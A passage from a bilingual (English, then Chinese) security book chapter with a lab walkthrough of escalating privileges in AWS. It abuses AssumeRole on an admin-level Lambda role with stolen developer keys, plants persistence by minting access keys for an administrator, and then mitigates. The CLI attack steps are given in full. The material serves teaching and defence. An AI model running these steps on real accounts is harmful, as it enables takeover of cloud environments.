- "## 第 5 章. 利用和保护配置错误的 AWS IAM 角色\n\n\n\n\nSecuring serverless applications involves\
  \ securing every identity in the AWS account. This includes IAM users, roles, and\
  \ other identities attackers could target to gain unauthorized access, escalate\
  \ privileges, and establish persistence in the cloud account. In this chapter, you’ll\
  \ work under the assumption that an attacker has gained access to leaked developer\
  \ credentials, and examine how overlooked IAM misconfigurations within an AWS account\
  \ can magnify the impact of a credential leak. You will explore how attackers exploit\
  \ misconfigurations to escalate privileges, focusing on techniques such as abusing\
  \ `AssumeRole` and leveraging AWS Lambda roles with excessive permissions.\n\nBy\
  \ the end of this chapter, you will be better equipped to recognize IAM misconfigurations\
  \ and assess Lambda execution roles for potential privilege escalation risks. In\
  \ addition, you’ll have a better idea of what to look for when auditing accounts\
  \ for persistence mechanisms that could allow attackers to maintain long-term access.\n\
  \n### Reviewing Technical Prerequisites\n\nTo follow along in this chapter, and\
  \ in Chapters 6 and 7 as well, you will need the following:\n\n* Two AWS accounts:\
  \ one to set up and host the vulnerable-by-design serverless lab environment (the\
  \ Serverless Lab account) and another for running simulated exploits (the Attacker\
  \ account). Make sure to have both accounts ready and open in separate browser sessions\
  \ (or incognito/private windows) to avoid session conflicts.\n* A code editor installed\
  \ on your local machine (such as `VS Code` or `Sublime Text`).\n\nIf you are using\
  \ Windows, ensure you have a way to run macOS or Linux commands—for example, by\
  \ using `WSL`, `Git Bash`, or a `VM` with a Linux distribution.\n\n#### Note\nTo\
  \ help you work through the exercises and simulations, a copy of the code and commands\
  \ used in this chapter is available in a [GitHub gist (see `ch05.md`)](https://oreil.ly/0mSPU).\n\
  \n### Abusing AssumeRole for Privilege Escalation\n\n`AssumeRole` allows a user,\
  \ application, or service to temporarily take on the permissions of an IAM role\
  \ by obtaining short-term credentials from AWS STS.^1 This provides secure access\
  \ to resources without requiring long-term credentials.\n\nIn this section, you\
  \ will explore how `AssumeRole`, combined with a misconfigured IAM role, can be\
  \ used to escalate privileges within an AWS account. You will set up and configure\
  \ an IAM role that serves as both a Lambda execution role and a developer-access\
  \ role. This setup allows Lambda functions to run with the permissions they need\
  \ while also letting developers assume the same role for debugging. Although this\
  \ approach enables developers to troubleshoot using the same permissions as the\
  \ Lambda functions, it also introduces a significant security risk, since attackers\
  \ who compromise developer accounts could exploit `AssumeRole` to escalate privileges.\n\
  \nTo walk through how attackers can abuse `AssumeRole` to escalate privileges, this\
  \ section is divided into the following parts:\n\n* “Setting Up an Overly Permissive\
  \ IAM Role”\n* “Setting Up IAM Groups and Users”\n* “Deploying a Lambda Function\
  \ with an Overly Permissive IAM Role”\n* “Leveraging AssumeRole to Escalate Privileges”\n\
  * “Establishing Persistence with New IAM User Credentials”\n\nAfter completing this\
  \ section, you’ll be more capable of catching subtle misconfigurations and security\
  \ risks that attackers could exploit to escalate privileges. At the same time, you’ll\
  \ understand how privilege escalation can enable attackers to create backdoors and\
  \ establish persistence in the cloud account.\n\n#### Setting Up an Overly Permissive\
  \ IAM Role\n\n`AssumeRole` by itself is not inherently dangerous, but when combined\
  \ with an overly permissive IAM role, it creates a pathway for privilege escalation\
  \ inside the AWS account. In this section, you will create an IAM role with the\
  \ `AdministratorAccess` managed policy attached, which will give anyone who assumes\
  \ the role full administrative privileges. While this might seem uncommon, it can\
  \ happen when development teams rush to deliver features and prioritize convenience\
  \ over security best practices.\n\nYou can think of this as having a master keycard\
  \ that opens every door in a corporate building. While it can be useful in emergencies,\
  \ if that keycard falls into the wrong hands, it could grant unrestricted access\
  \ to sensitive areas and allow someone to take full control of the facility.\n\n\
  #### Note\nThis section assumes you are using the Serverless Lab account, which\
  \ will host the vulnerable-by-design serverless lab environment.\n\nLet’s proceed\
  \ with the creation of the overly permissive IAM role:\n\n1. Open a new browser\
  \ tab and sign in to the [AWS Management Console](https://oreil.ly/qe5es) by using\
  \ your Serverless Lab account.\n2. Type `iam` in the search bar and then select\
  \ IAM from the list of matching services.\n3. In the left navigation pane of the\
  \ IAM Console Home page, select Roles under Access Management. Then click the Create\
  \ Role button.\n\n#### Note\nThis should guide you through the process of creating\
  \ a role, which consists of three steps: selecting a trusted entity; adding permissions;\
  \ and naming, reviewing, and creating the role.\n\n4. On the “Select trusted entity”\
  \ page, under “Select trusted entity,” select “Custom trust policy.” Then specify\
  \ the following JSON policy in the editor:\n\n```\n{\n  \"Version\": \"2012-10-17\"\
  ,\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\"\
  : {\n        \"Service\": \"lambda.amazonaws.com\"\n      },\n      \"Action\":\
  \ \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\"\
  : { \"AWS\": \"*\" },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\"\
  : {\n        \"StringLike\": {\n          \"aws:PrincipalArn\": \"arn:aws:iam::[ACCOUNT_ID]:user/*\"\
  \n        }\n      }\n    }\n  ]\n}\n```\n\nThis trust policy lets AWS Lambda and\
  \ any IAM user from the specified AWS account assume the role. This configuration\
  \ enables IAM users to directly assume the same role that Lambda functions use,\
  \ which simplifies debugging but also creates a significant security risk if a user\
  \ account is compromised. After adding the trust policy, click Next.\n\n#### Caution\n\
  Make sure to replace `[ACCOUNT_ID]` with your actual AWS account ID. You can find\
  \ this by clicking your account name in the upper-right corner of the AWS Management\
  \ Console and locating the 12-digit account ID displayed along with the drop-down\
  \ menu options.^2\n\n5. On the “Add permissions” page, under “Permissions policies,”\
  \ select the checkbox for the `AdministratorAccess` managed policy.^3 Then click\
  \ Next.\n6. On the “Name, review, and create” page, under “Role details,” type `lambda-assumable-role`\
  \ in the “Role name” field. Then click “Create role.”\n\n#### Note\nIf an “Overly\
  \ permissive trust policy” pop-up appears, simply click Continue to proceed.\n\n\
  With this setup, any IAM user in the Serverless Lab account can escalate their privileges\
  \ by assuming the role and inheriting all the permissions assigned to it. Since\
  \ this role has the `AdministratorAccess` managed policy attached, anyone who assumes\
  \ it effectively gains full control over the AWS account.\n\n#### Warning\n\n\n\n\
  \n\n完成本章中的示例后，请务必清理创建的资源，以确保你不会无意中留下攻击者可能利用来危害你的 AWS 账户的任何东西。\n\n#### 设置 IAM 组和用户\n\
  \n在本节中，你将创建两个 IAM 组：`Administrators` 和 `Developers`。`Administrators` 组将通过 `AdministratorAccess`\
  \ 受管策略获得对 AWS 账户的完全管理控制，而 `Developers` 组将获得管理 AWS Lambda 资源以及在账户中承担 IAM 角色的权限。\n\
  \n你还将创建 IAM 用户并将它们分配到这些组中，以模拟现实世界的账户配置。这次，与其使用 AWS 管理控制台，你将使用 CloudShell 终端来设置和配置这些\
  \ IAM 实体。\n\n#### Note\n\n本节假定你正在使用 Serverless Lab 账户，该账户托管易受攻击的按设计构建的无服务器实验室环境。\n\
  \n让我们从 CloudShell 终端逐步创建 IAM 组和用户：\n\n1. 在搜索栏中输入 `cloudshell`，然后从匹配的服务列表中选择 CloudShell。\n\
  2. 在 CloudShell 终端中，运行以下命令（`$` 符号之后）来创建一个 IAM 组并将 `AdministratorAccess` 策略附加到它：\n\
  \n```\naws iam create-group --group-name Administrators\n\naws iam attach-group-policy\
  \ \\\n  --group-name Administrators \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\
  ```\n\n这样，任何添加到 `Administrators` 组的用户都会自动获得对 AWS 账户的完全管理权限。\n\n3. 创建一个名为 `Administrator001`\
  \ 的新 IAM 用户并将其添加到 `Administrators` 组：\n\n```\nADMINISTRATOR=\"Administrator001\"\
  \n\naws iam create-user --user-name $ADMINISTRATOR\n\naws iam add-user-to-group\
  \ \\\n  --user-name $ADMINISTRATOR \\\n  --group-name Administrators\n```\n\n####\
  \ Note\n\n在实践中，你可能会创建映射到组织内实际用户的 IAM 用户账户。例如，名为 Jane Doe 的管理员可能会被分配一个类似 `jdoe` 或\
  \ `jane.doe` 的 IAM 用户名。这使得审计活动和管理访问权限变得更容易。\n\n现在你已经创建了 `Administrators` 组并向其中添加了一个用户，让我们继续设置\
  \ `Developers` 组：\n\n1. 在 CloudShell 终端中，运行以下命令来创建一个 `Developers` 组并将 `AWSLambda_FullAccess`\
  \ 策略附加到它：\n\n```\naws iam create-group --group-name Developers\n\naws iam attach-group-policy\
  \ \\\n  --group-name Developers \\\n  --policy-arn arn:aws:iam::aws:policy/AWSLambda_FullAccess\n\
  ```\n\n这样，任何添加到 `Developers` 组的用户都会自动获得管理 Lambda 函数的完全权限。\n\n2. 定义一个自定义 IAM 策略，允许开发人员承担同一\
  \ AWS 账户中的任何角色：\n\n```\nAWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account\
  \ --output text)\n\necho \"{\n  \\\"Version\\\": \\\"2012-10-17\\\",\n  \\\"Statement\\\
  \": [\n    {\n      \\\"Effect\\\": \\\"Allow\\\",\n      \\\"Action\\\": \\\"sts:AssumeRole\\\
  \",\n      \\\"Resource\\\": \\\"arn:aws:iam::${AWS_ACCOUNT_ID}:role/*\\\"\n   \
  \ }\n  ]\n}\" > custom-developers-policy.json\n```\n\n3. 将自定义 `AssumeRole` 策略作为内联策略附加到\
  \ `Developers` 组：\n\n```\naws iam put-group-policy \\\n  --group-name Developers\
  \ \\\n  --policy-name AssumeRolePolicy \\\n  --policy-document file://custom-developers-policy.json\n\
  ```\n\n4. 创建一个名为 `Developer001` 的新 IAM 用户并将其分配到 `Developers` 组：\n\n```\nDEVELOPER=\"\
  Developer001\"\n\naws iam create-user --user-name $DEVELOPER\n\naws iam add-user-to-group\
  \ \\\n  --user-name $DEVELOPER \\\n  --group-name Developers\n```\n\n这次，IAM 用户被分配到一个权限集更受限制的组。\n\
  \n5. 为新用户生成访问密钥 ID 以及秘密访问密钥：\n\n```\naws iam create-access-key --user-name $DEVELOPER\n\
  ```\n\n这应该返回以下 JSON 响应：\n\n```\n{\n    \"AccessKey\": {\n        \"UserName\": \"\
  Developer001\",\n        \"AccessKeyId\": \"...\",\n        \"Status\": \"Active\"\
  ,\n        \"SecretAccessKey\": \"...\",\n        \"CreateDate\": \"...\"\n    }\n\
  }\n```\n\n#### Caution\n\n请务必在继续下一步之前复制 `AccessKeyId` 和 `SecretAccessKey` 并将其安全地存储在你的本地机器上。\n\
  \n6. 运行以下命令通过创建登录配置文件为新用户（`Developer001`）启用 AWS 管理控制台访问权限：\n\n```\nUSER_PASSWORD=$(openssl\
  \ rand -base64 16)\nUSER_USERNAME=$DEVELOPER\n\naws iam create-login-profile \\\n\
  \  --user-name $USER_USERNAME \\\n  --password \"$USER_PASSWORD\" \\\n  --no-password-reset-required\n\
  ```\n\n以下响应应表明登录配置文件已成功创建，并且用户在首次登录时不需要重置密码：\n\n```\n{\n    \"LoginProfile\": {\n\
  \        \"UserName\": \"Developer001\",\n        \"CreateDate\": \"...\",\n   \
  \     \"PasswordResetRequired\": false\n    }\n}\n```\n\n7. 为 AWS 管理控制台生成登录 URL\
  \ 并在终端中打印新用户（`Developer001`）的登录凭据：\n\n```\nAWS_ACCOUNT_ID=$(aws sts get-caller-identity\
  \ --query Account --output text)\nSIGN_IN_URL=\"https://${AWS_ACCOUNT_ID}.signin.aws.amazon.com/console\"\
  \n\necho -e \"$SIGN_IN_URL\\n\\nU: $USER_USERNAME\\nP: $USER_PASSWORD \\n\"\n```\n\
  \n你将在下一节中使用这些登录凭据从 AWS 管理控制台部署 Lambda 函数。所有先决条件准备就绪后，让我们继续设置和配置一个具有配置不当的 IAM 角色的\
  \ Lambda 函数。\n\n#### 部署具有过度宽松 IAM 角色的 Lambda 函数\n\n在本节中，我们将逐步介绍设置新的 Lambda 函数并使用过度宽松的\
  \ IAM 角色配置它的过程。你将首先使用上一节生成的登录凭据登录 AWS 管理控制台。之后，你将设置一个 Lambda 函数并使用现有的 IAM 角色（`lambda-assumable-role`）对其进行配置，该角色具有过多的权限。最后，你将发布新的函数版本以模拟开发人员的生产发布流程。\n\
  \n这个过程就像给实习生分配一张万能门禁卡，以便他们在协助日常运营的同时更轻松地在各部门之间移动。然而，如果攻击者诱骗实习生分享或借出该卡，它可能被用来访问敏感区域并危害整个设施。\n\
  \n#### Note\n\n本节假定你正在使用 Serverless Lab 账户，该账户将托管易受攻击的按设计构建的无服务器实验室环境。\n\n现在，让我们模拟开发人员如何使用上一节生成的凭据来设置具有配置不当的\
  \ IAM 角色的新 Lambda 函数：\n\n1. 在新的浏览器窗口中——最好使用不同的浏览器或访客/隐身会话——使用 `Developer001` 的凭据登录\
  \ AWS 管理控制台。\n\n    ![](img/lsse_0501.png)\n\n    ### Note\n\n    请务必使用账户特定的登录 URL：`https://<account_id>.signin.aws.amazon.com/console`。\n\
  \n2. 在搜索栏中输入 `lambda`，然后从匹配的服务列表中选择 Lambda。\n\n    ### Caution\n\n    在本章中，所有示例都假定你的\
  \ AWS 区域设置为 `us-east-1`。请确保 AWS 控制台右上角选择的区域设置为 `N. Virginia (us-east-1)`。\n\n3.\
  \ 在左侧导航窗格中，选择 Functions，然后单击“Create function。”\n\n\n\n\n\n4. 在“创建函数”页面，选择“从头开始创建”。在“基本信息”窗格中，在“函数名称”字段中指定\
  \ `lambda-0000`（图 5-2）。\n\n![](img/lsse_0502.png)\n\n对于运行时，选择 Python 3.13。^5 在“更改默认执行角色”部分下，在“执行角色”下，选择“使用现有角色”。从“现有角色”下拉列表中，选择\
  \ `lambda-assumable-role`。然后单击“创建函数”。\n\n#### Note\n你应该会收到一条确认消息，内容为 `Successfully\
  \ created the function lambda-0010`。Lambda 函数创建完成后，下一步是更新其代码、运行测试并发布新版本。\n\n5. 导航到“代码源”部分，然后用以下内容替换现有的\
  \ `lambda_function.py` 代码：\n\n```\nimport json\n\ndef lambda_handler(event, context):\n\
  \    output = \"Learning Serverless Security!\"\n\n    return {\n        'statusCode':\
  \ 200,\n        'body': json.dumps(output)\n    }\n```\n\n此基本 Lambda 函数返回一条静态消息。这只是生产环境中可能运行的任何真实无服务器函数代码的示例占位符。\n\
  \n在 `lambda_function.py` 中完成更新后，单击部署。\n\n6. 要测试你创建的 Lambda 函数：\n\n1. 单击测试。\n\n2.\
  \ 单击“创建新的测试事件”。对于事件名称，输入 `event-0000`，对于事件 JSON，输入 `{}`。\n\n3. 单击保存按钮。\n\n4. 单击调用。这会产生以下输出响应：\n\
  \n```\nStatus: Succeeded\nTest Event Name: event-0000\n\nResponse:\n{\n  \"statusCode\"\
  : 200,\n  \"body\": \"\\\"Learning Serverless Security!\\\"\"\n}\n```\n\n7. 现在，让我们创建一个新版本：\n\
  \n1. 导航到版本选项卡。\n\n2. 单击“发布新版本”。\n\n3. 单击发布。发布版本 1 后，它将列在版本选项卡下。\n\n至此，你已完成了本章的初始有意易受攻击的无服务器实验室设置。在下一节中，你将模拟攻击者利用\
  \ `AssumeRole` 以及配置不当的 IAM 角色来提升权限。\n\n#### Leveraging AssumeRole to Escalate Privileges\n\
  \n在本节中，你将研究 `AssumeRole` 如何被低权限 IAM 用户用来提升权限。更具体地说，你将模拟攻击者如何使用 `Developer001` 的凭据执行权限提升并承担附加了\
  \ `AdministratorAccess` 策略的 IAM 角色。\n\n我们将从假设攻击者事先获得了 `Developer001` 的凭据开始——可能通过窃取凭据的有毒\
  \ NPM 包或从公开仓库中泄露的硬编码密钥，该密钥包含在提交历史中。你将使用这些凭据来模拟攻击：定位易受攻击的 Lambda，通过 `AssumeRole`\
  \ 承担其执行角色，并验证临时凭据允许的操作。\n\n#### Note\n本节假设你使用攻击者账户来模拟攻击者尝试利用无服务器实验室环境中的资源。\n\n让我们逐步了解攻击者如何利用\
  \ `AssumeRole` 来提升权限：\n\n1. 打开一个新的浏览器标签页，并使用你的攻击者账户登录 [AWS 管理控制台](https://oreil.ly/qe5es)。\n\
  \n#### Tip\n登录时打开不同的浏览器或隐身/私人窗口，以确保此会话不会干扰已登录的任何账户。\n\n2. 使用 `Developer001` 的凭据配置\
  \ AWS CLI：\n\n```\naws configure --profile target-dev-account\n```\n\n这将提示你输入 AWS\
  \ 凭据、默认区域和默认输出格式：\n\n```\nAWS Access Key ID [None]: [Specify Developer001 AWS Access\
  \ Key ID]\nAWS Secret Access Key [None]: [Specify Developer001 AWS Secret Access\
  \ Key]\nDefault region name [None]: [Press Enter]\nDefault output format [None]:\
  \ [Press Enter]\n```\n\n3. 运行以下命令以验证所承担角色的凭据：\n\n```\naws sts get-caller-identity\
  \ --profile target-dev-account\n```\n\n这会返回以下响应：\n\n```\n{\n    \"UserId\": \"*********************\"\
  ,\n    \"Account\": \"************\",\n    \"Arn\": \"arn:aws:iam::************:user/Developer001\"\
  \n}\n```\n\n#### Note\n`Account` 值应与你的无服务器实验室账户的账户 ID 匹配，即使你是从攻击者账户执行该命令。\n\n4.\
  \ 让我们检查你是否能够运行 `aws iam get-user`：\n\n```\naws iam get-user --profile target-dev-account\n\
  ```\n\n以下错误消息应表明 IAM 用户无权调用 `iam:GetUser`：\n\n```\nAn error occurred (AccessDenied)\
  \ when calling the GetUser operation: User: arn:aws:iam::*****************:user/Developer001\
  \ is not authorized to perform: iam:GetUser on resource: user Developer001 because\
  \ no identity-based policy allows the iam:GetUser action\n```\n\n5. 尝试检索账户中所有可用的\
  \ AWS 区域列表：^6\n\n```\nREGIONS=$(aws ec2 describe-regions \\\n    --query \"Regions[].RegionName\"\
  \ \\\n    --profile target-dev-account \\\n    --output text)\n```\n\n如果用户无权调用 `ec2:DescribeRegions`，则应出现以下授权错误：\n\
  \n```\nAn error occurred (UnauthorizedOperation) when calling the DescribeRegions\
  \ operation: You are not authorized to perform this operation. User: arn:aws:iam::*****************:user/Developer001\
  \ is not authorized to perform: ec2:DescribeRegions because no identity-based policy\
  \ allows the ec2:DescribeRegions action\n```\n\n6. 或者，你也可以通过以下方式使用硬编码的 AWS 区域列表：\n\
  \n```\nREGIONS=(ap-south-1 eu-north-1 eu-west-3 eu-west-2 eu-west-1 ap-northeast-3\
  \ ap-northeast-2 ap-northeast-1 ca-central-1 sa-east-1 ap-southeast-1 ap-southeast-2\
  \ eu-central-1 us-east-1 us-east-2 us-west-1 us-west-2)\n```\n\n```\nfor region\
  \ in \"${REGIONS[@]}\"; do\n  echo \"[+] aws lambda list-functions --region $region\"\
  \n  aws lambda list-functions --region $region --profile target-dev-account\n  echo\
  \ -e \"\\n\"\ndone\n```\n\n以下响应表明在扫描的某个区域中存在 Lambda 函数：\n\n```\n...\n\n{\n    \"\
  Functions\": [\n        {\n            \"FunctionName\": \"lambda-0000\",\n    \
  \        \"FunctionArn\": \"...:function:lambda-0000\",\n            \"Runtime\"\
  : \"python3.13\",\n            \"Role\": \"arn:aws:iam::ACCOUNT_ID:role/lambda-assumable-role\"\
  ,\n            \"Handler\": \"lambda_function.lambda_handler\",\n            \"\
  CodeSize\": 268,\n            \"Description\": \"\",\n            \"Timeout\": 3,\n\
  \            \"MemorySize\": 128,\n            ...\n            \"LoggingConfig\"\
  : {\n                \"LogFormat\": \"Text\",\n                \"LogGroup\": \"\
  /aws/lambda/lambda-0000\"\n            }\n        },\n    ]\n}\n\n...\n```\n\n7.\
  \ 运行以下命令以承担 Lambda 角色并为目标账户获取临时凭据：\n\n```\nACCOUNT_ID=$(aws sts get-caller-identity\
  \ \\\n    --profile target-dev-account \\\n    | jq -r \".Account\")\n\nROLE_ARN=\"\
  arn:aws:iam::$ACCOUNT_ID:role/lambda-assumable-role\"\n\nSTS_OUTPUT=$(aws sts assume-role\
  \ \\\n  --role-arn $ROLE_ARN \\\n  --role-session-name assume-session-000 \\\n \
  \ --profile target-dev-account)\n\necho $STS_OUTPUT\n```\n\n这会返回以下 JSON 输出：\n\n\n\
  \n\n\n```\n{\n    \"Credentials\": {\n        \"AccessKeyId\": \"...\",\n      \
  \  \"SecretAccessKey\": \"...\",\n        \"SessionToken\": \"...\",\n        \"\
  Expiration\": \"...\"\n    },\n    \"AssumedRoleUser\": {\n        \"AssumedRoleId\"\
  : \"...\",\n        \"Arn\": \"...\"\n    }\n}\n```\n\n##### 8. 使用临时凭证创建一个名为 `assumed-lambda-role`\
  \ 的配置文件：\n\n```\nKEY_ID=$(echo $STS_OUTPUT | \\\n    jq -r \".Credentials.AccessKeyId\"\
  )\n\nSECRET_ACCESS_KEY=$(echo $STS_OUTPUT | \\\n    jq -r \".Credentials.SecretAccessKey\"\
  )\n\nSESSION_TOKEN=$(echo $STS_OUTPUT | \\\n    jq -r \".Credentials.SessionToken\"\
  )\n\naws configure set aws_access_key_id $KEY_ID \\\n    --profile assumed-lambda-role\n\
  \naws configure set aws_secret_access_key $SECRET_ACCESS_KEY \\\n    --profile assumed-lambda-role\n\
  \naws configure set aws_session_token $SESSION_TOKEN \\\n    --profile assumed-lambda-role\n\
  ```\n\n##### 9. 运行以下命令来测试所假设角色的凭证：\n\n```\naws sts get-caller-identity --profile\
  \ assumed-lambda-role\n```\n\n以下响应表示所假设角色会话已成功建立：\n\n```\n{\n    \"UserId\": \"\
  ...:assume-session-000\",\n    \"Account\": \"...\",\n    \"Arn\": \"...:assumed-role/lambda-assumable-role/assume-session-000\"\
  \n}\n```\n\n##### 10. 列出附加到所假设角色的内联策略：\n\n```\naws iam list-role-policies \\\n \
  \   --role-name lambda-assumable-role \\\n    --profile assumed-lambda-role\n```\n\
  \n以下响应表示该角色未附加任何内联策略：\n\n```\n{\n    \"PolicyNames\": []\n}\n```\n\n##### 11. 列出附加到\
  \ IAM 角色的管理策略：\n\n```\naws iam list-attached-role-policies \\\n    --role-name lambda-assumable-role\
  \ \\\n    --profile assumed-lambda-role\n```\n\n这会返回以下 JSON 输出，显示 IAM 角色已附加 `AdministratorAccess`\
  \ 管理策略：\n\n```\n{\n    \"AttachedPolicies\": [\n        {\n            \"PolicyName\"\
  : \"AdministratorAccess\",\n            \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\
  \n        }\n    ]\n}\n```\n\n请记住，使用 `assumed-lambda-role` AWS CLI 配置文件时，您实际上是以\
  \ `AdministratorAccess` 权限运行。此时，您应该对攻击者如何利用 `AssumeRole` 从被攻破的开发者账户将权限提升到更高权限的 IAM\
  \ 角色有了一个很好的了解。\n\n#### 通过新的 IAM 用户凭证建立持久化访问\n\n在本节中，您将模拟攻击者通过为属于 `Administrators`\
  \ 组的现有 IAM 用户生成新的凭证来建立长期访问。您将首先使用上一节中的 `assumed-lambda-role` 配置文件枚举 IAM 组并识别潜在的目标\
  \ IAM 用户。之后，您将为 `Administrators` 组中的用户创建新的长期凭证。最后，您将使用这些凭证配置 CLI 配置文件，以模拟攻击者保留对被攻破\
  \ AWS 账户的访问。\n\n> Note\n> 本节假设您使用的是 Attacker 账户来模拟攻击者对无服务器实验室环境中资源进行利用的尝试。\n\n让我们继续进行模拟：\n\
  \n##### 1. 使用 `assumed-lambda-role` 配置文件，列出账户中当前存在的所有 IAM 组：\n\n```\naws iam list-groups\
  \ --profile assumed-lambda-role\n```\n\n这会返回以下 JSON 响应，显示账户配置了两个用户组：`Administrators`\
  \ 和 `Developers`：\n\n```\n{\n    \"Groups\": [\n        {\n            \"Path\"\
  : \"/\",\n            \"GroupName\": \"Administrators\",\n            \"GroupId\"\
  : \"...\",\n            \"Arn\": \"arn:aws:iam::...:group/Administrators\",\n  \
  \          \"CreateDate\": \"...\"\n        },\n        {\n            \"Path\"\
  : \"/\",\n            \"GroupName\": \"Developers\",\n            \"GroupId\": \"\
  ...\",\n            \"Arn\": \"arn:aws:iam::...:group/Developers\",\n          \
  \  \"CreateDate\": \"...\"\n        }\n    ]\n}\n```\n\n##### 2. 检索分配给 `Administrators`\
  \ 组的成员列表：\n\n```\naws iam get-group \\\n    --group-name Administrators \\\n   \
  \ --profile assumed-lambda-role\n```\n\n您应该得到以下 JSON 响应，其中表明 `Administrator001`\
  \ 是 `Administrators` 组的成员：\n\n```\n{\n    \"Users\": [\n        {\n            \"\
  Path\": \"/\",\n            \"UserName\": \"Administrator001\",\n            \"\
  UserId\": \"...\",\n            \"Arn\": \"arn:aws:iam::...:user/Administrator001\"\
  ,\n            \"CreateDate\": \"...\"\n        }\n    ],\n    \"Group\": {\n  \
  \      \"Path\": \"/\",\n        \"GroupName\": \"Administrators\",\n        \"\
  GroupId\": \"...\",\n        \"Arn\": \"arn:aws:iam::...:group/Administrators\"\
  ,\n        \"CreateDate\": \"...\"\n    }\n}\n```\n\n##### 3. 运行以下命令为 IAM 用户 `Administrator001`\
  \ 创建新的访问密钥：\n\n```\naws iam create-access-key \\\n    --user-name Administrator001\
  \ \\\n    --profile assumed-lambda-role\n```\n\n这会返回以下 JSON 输出：\n\n```\n{\n    \"\
  AccessKey\": {\n        \"UserName\": \"Administrator001\",\n        \"AccessKeyId\"\
  : \"...\",\n        \"Status\": \"Active\",\n        \"SecretAccessKey\": \"...\"\
  ,\n        \"CreateDate\": \"...\"\n    }\n}\n```\n\n> Caution\n> 在继续下一步之前，请务必复制\
  \ `AccessKeyId` 和 `SecretAccessKey` 并将其安全地存储在本地机器上。您可以暂时将值存储在代码编辑器中。\n\n##### 4.\
  \ 使用生成的长期访问密钥配置 `admin-001` 配置文件：\n\n```\naws configure set aws_access_key_id KEY_ID\
  \ --profile admin-001\naws configure set aws_secret_access_key SECRET_ACCESS_KEY\
  \ --profile admin-001\n```\n\n> Caution\n> 请务必将 `KEY_ID` 和 `SECRET_ACCESS_KEY` 替换为上一步中检索到的\
  \ `AccessKeyId` 和 `SecretAccessKey` 值。\n\n##### 5. 确保 `admin-001` 配置文件已正确配置并通过身份验证：\n\
  \n```\naws sts get-caller-identity --profile admin-001\n```\n\n以下响应应确认 `admin-001`\
  \ 配置文件已作为 `Administrator001` 正确通过身份验证：\n\n```\n{\n    \"UserId\": \"...\",\n   \
  \ \"Account\": \"...\",\n    \"Arn\": \"arn:aws:iam::...:user/Administrator001\"\
  \n}\n```\n\n从这里开始，攻击者可以利用新的凭证访问 Serverless Lab 账户中的各种资源，即使原始被攻破的凭证已被轮换或停用。\n\n从防御安全角度来看，您应定期对\
  \ AWS 账户中的 IAM 主体、附加策略和信任关系进行彻底审计。最好深入挖掘，查找意外的用户、长期存在的访问密钥、过于宽松的角色信任策略，以及新添加的授予过度权限的内联或托管策略，这些都是持久化访问和权限提升尝试的常见指标。此外，您还应强制对\
  \ *所有* IAM 用户账户实施 MFA，并实施严格的最小权限访问控制，以降低未经授权访问以及攻击者权限提升的风险。\n\n### 通过配置错误的 IAM 角色的\
  \ AWS Lambda 函数提升权限并建立持久化访问\n\n现在，让我们探讨攻击者如何通过配置了过于宽松的 IAM 角色的 AWS Lambda 函数来提升权限并建立持久化访问。为了帮助您深入了解权限提升如何导致持久化访问，本节分为以下几个部分：\n\
  \n\n\n\n*   “缓解 AssumeRole 权限提升漏洞”\n\n*   “重新配置 AWS CLI 并验证 AssumeRole 不再可用于提升权限”\n\
  \n*   “滥用函数过于宽松的执行角色以提升权限”\n\n*   “使用新的 IAM 用户凭证建立持久性”\n\n*   “通过后门 Lambda 版本建立持久性”\n\
  \n完成本节后，您将更善于识别危险信号、检测可疑活动，并评估 Lambda 函数及其 IAM 角色是否存在潜在的配置错误和安全风险。\n\n#### 缓解 AssumeRole\
  \ 权限提升漏洞\n\n本章前面，您探讨了攻击者如何通过利用 `AssumeRole` 权限来提升权限。在本节中，您将模拟一名安全工程师缓解 `AssumeRole`\
  \ 权限提升漏洞。您将首先从 `Developers` 组中移除 `AssumeRole` 权限，然后继续更新 `lambda-assumable-role`\
  \ IAM 角色的信任策略。\n\n#### Note\n\n本节假设您使用的是 Serverless Lab 根账户来配置 Serverless Lab AWS\
  \ 账户中的 IAM 权限和信任关系。虽然不建议从根账户进行 IAM 更改，但在本节中使用它是为了简化实验环境设置。\n\n让我们开始模拟：\n\n1. 在搜索栏中输入\
  \ `iam`，然后从匹配的服务列表中选择 IAM。\n2. 在 IAM 控制台主页的左侧导航窗格中，在访问管理下选择“用户组”。\n3. 从“用户组”列表中，单击\
  \ `Developers`。\n4. 在权限选项卡上，选择 `AssumeRolePolicy`，然后单击删除。\n\n#### Note\n\n按照提示操作——例如在文本输入字段中输入内联策略名称——以确认删除。\n\
  \n接下来，让我们更新信任策略，以便 IAM 用户不再能够承担 `assumable-role` 角色：\n\n1. 在左侧导航窗格中，在访问管理下选择角色。\n\
  2. 在搜索框中输入 `assumable` 以定位 `assumable-role` 角色。单击 `lambda-assumable-role`。\n3. 在“信任关系”选项卡上，单击“编辑信任策略”。\n\
  4. 在“编辑信任策略”页面上，在文本区域中指定以下策略：\n\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"\
  Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\"\
  : {\n                \"Service\": \"lambda.amazonaws.com\"\n            },\n   \
  \         \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n```\n\n单击“更新策略”。`Trust\
  \ policy updated` 通知会出现，表明信任策略已成功更新。\n\n您现在已成功缓解了 `AssumeRole` 权限提升漏洞。请记住，缓解漏洞通常涉及权衡，如果未仔细规划，对\
  \ IAM 角色施加过于严格的权限有时会破坏正常操作。始终验证 IAM 修改是否保留了授权用户和服务所需的访问权限和功能。\n\n#### 重新配置 AWS CLI\
  \ 并验证 AssumeRole 不再可用于提升权限\n\n在本节中，您将删除攻击者账户 CloudShell 终端中保存的所有 AWS CLI 配置文件和凭证，然后使用\
  \ `Developer001` IAM 用户的凭证重新配置 CLI。然后您将确认，使用 `Developer001` 的被盗凭证，攻击者无法再使用 `AssumeRole`\
  \ 执行权限提升。\n\n#### Note\n\n本节假设您使用攻击者账户来模拟攻击者对无服务器实验环境中资源的利用尝试。\n\n让我们逐步介绍重新配置 `Developer001`\
  \ 的 AWS CLI 配置文件并确认攻击者无法使用 `AssumeRole` 提升权限的步骤：\n\n1. 运行以下命令以删除 CloudShell 终端环境中保存的所有\
